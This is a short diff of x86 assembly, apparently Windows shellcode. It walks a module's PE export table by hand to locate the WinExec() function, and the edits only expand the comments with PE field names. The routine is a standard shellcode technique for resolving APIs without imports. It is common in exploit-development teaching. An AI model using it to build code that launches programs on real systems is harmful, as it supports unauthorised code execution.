@@ -25,8 +25,8 @@ start:
 	add edx, ebx                		; get the exact location of the NT header
 	mov edx, [edx+0x78]         		; get the offset of export table
 	add edx, ebx                		; get the exact location of the export table
-	mov esi, [edx+0x20]         		; get Name Pointer Table offset
-	add esi, ebx                		; get the exact location of the Name Pointer Table
+	mov esi, [edx+0x20]         		; get Name Pointer Table (AddressOfNames) offset
+	add esi, ebx                		; get the exact location of the Name Pointer Table (AddressOfNames)
 
 .loop:
 	mov eax, [esi+ecx*4]                	; get the offset the string address of the function name
@@ -41,8 +41,8 @@ start:
 
 .continue:
 	dec ecx 				; decrease ecx by 1 cause array starts from 0
-	mov esi, [edx+0x24]         		; get Ordinals Table offset
-	add esi, ebx                		; get the exact location of the Ordinals Table
+	mov esi, [edx+0x24]         		; get Ordinals Table (AddressOfNameOrdinals) offset
+	add esi, ebx                		; get the exact location of the Ordinals Table (AddressOfNameOrdinals)
 	mov cx, [esi+ecx*2]			; get the index of WinExec() since each index is 2 bytes
 	mov esi, [edx+0x1c]         		; get AddressOfFunctions (AddressTable) offset
 	add esi, ebx                		; get the exact location of the AddressOfFunctions (AddressTable)
